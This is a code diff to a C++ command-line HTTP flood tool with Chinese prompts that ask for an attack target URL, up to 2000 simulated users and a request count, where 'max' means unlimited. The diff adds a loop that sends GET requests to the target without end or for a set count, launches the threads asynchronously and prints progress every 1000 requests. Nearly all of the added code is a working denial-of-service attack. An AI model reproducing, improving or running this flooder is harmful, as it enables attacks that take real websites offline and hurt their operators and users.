@@ -7,9 +7,33 @@ using namespace std;
 
 string version_name = "1.0 Public";
 
-void http_attack_one_thread(string number , string target) {
+[[noreturn]] void http_attack_one_thread(string number , string target , int j) {
     auto* httpRequests = new HttpRequests(target);
-
+    try {
+        if (number == "max") {
+            int run_number = 0;
+            while (true) {
+                httpRequests->GetRequest();
+                run_number += 1;
+                if (run_number % 1000 == 0) {
+                    cout << "[INFO] Attack " << target << " Number: " << run_number << " Thread: " << j << endl;
+                }
+            }
+        } else {
+            int run_number = 0;
+            for (int i = 0 ; i < stoi(number) ; i++) {
+                httpRequests->GetRequest();
+                run_number += 1;
+                //cout << run_number << endl;
+                if (run_number % 1000 == 0) {
+                    cout << "[INFO] Attack " << target << " Number: " << run_number << " Thread: " << j << endl;
+                }
+            }
+            cout << "\n[FINISH] Attack Finish." << endl;
+        }
+    }catch (const runtime_error & e) {
+        cout << e.what() << endl;
+    }
 }
 
 void HttpAttack() {
@@ -17,14 +41,19 @@ void HttpAttack() {
     try {
         string target = trim(input("输入攻击目标 URL: "));
         int thread = stoi(trim(input("输入模拟的用户数量(最高 2000): ")));
+        if (thread > 2000) {
+            throw runtime_error("输入线程数量大于 2000");
+        }
         string number = trim(input("输入当个用户发送的数据量(输入max则不限量): "));
+        std::vector<std::future<void>> futures;
 
+        futures.reserve(thread);
         for (int i = 0 ; i < thread ;i++){
-            std::thread t(http_attack_one_thread , number , target);
+            futures.emplace_back(std::async(http_attack_one_thread, number , target , i));
         }
 
-    }catch (const runtime_error) {
-        cout << "错误的输入" << endl;
+    }catch (const runtime_error &e) {
+        cout << "错误的输入: " << e.what() << endl;
     }
 }
 
@@ -70,6 +99,12 @@ int main() {
         }
         else if (command == "1") {
             HttpAttack();
+        }
+        else if (command == "2") {
+
+        }
+        else if (command == "5") {
+
         }
         else {
             cout << "[!] ERROR INPUT: " << command << endl; // error command.
